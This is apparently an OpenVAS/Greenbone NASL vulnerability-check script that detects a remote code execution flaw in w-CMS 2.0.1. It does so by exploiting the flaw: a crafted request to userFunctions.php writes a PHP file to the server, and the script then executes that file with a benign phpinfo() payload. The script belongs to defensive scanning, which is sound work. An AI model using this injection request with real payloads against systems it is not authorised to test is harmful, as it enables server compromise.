if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103762" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "8.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:P/A:N" );
	script_name( "w-CMS 2.0.1 Remote Code Execution" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/122833/w-CMS-2.0.1-Remote-Code-Execution.html" );
	script_xref( name: "URL", value: "http://w-cms.info/" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-08-16 11:12:08 +0200 (Fri, 16 Aug 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successfully exploiting this issue may allow an attacker to
  execute arbitrary code in the context of the user running the affected application." );
	script_tag( name: "vuldetect", value: "Send a HTTP POST request which execute the phpinfo() command
  and check the response if it was successful." );
	script_tag( name: "insight", value: "Input passed to userFunctions.php is not properly sanitized." );
	script_tag( name: "solution", value: "Ask the Vendor for an update." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "w-CMS is prone to a remote code execution vulnerability." );
	script_tag( name: "affected", value: "w-CMS 2.0.1 is vulnerablei, other versions may also be affected." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/cms", "/w-cms", "/w_cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	buf = http_get_cache( item: url, port: port );
	if(!buf || !egrep( pattern: "Powered by.*w-CMS", string: buf )){
		continue;
	}
	vtstrings = get_vt_strings();
	file = vtstrings["lowercase_rand"] + ".php";
	url = dir + "/userFunctions.php?udef=activity&type=" + file + "&content=%3C?php%20phpinfo();%20?%3E";
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	url = dir + "/public/" + file;
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(ContainsString( buf, "<title>phpinfo()" )){
		url = dir + "/userFunctions.php?udef=activity&type=" + file + "&content=%3C?php%20exit;%20?%3E";
		req = http_get( item: url, port: port );
		buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
		msg = "Scanner was able to create the file /public/" + file + " and to execute it. Please remove this file as soon as possible.";
		security_message( port: port, data: msg );
		exit( 0 );
	}
}
exit( 99 );

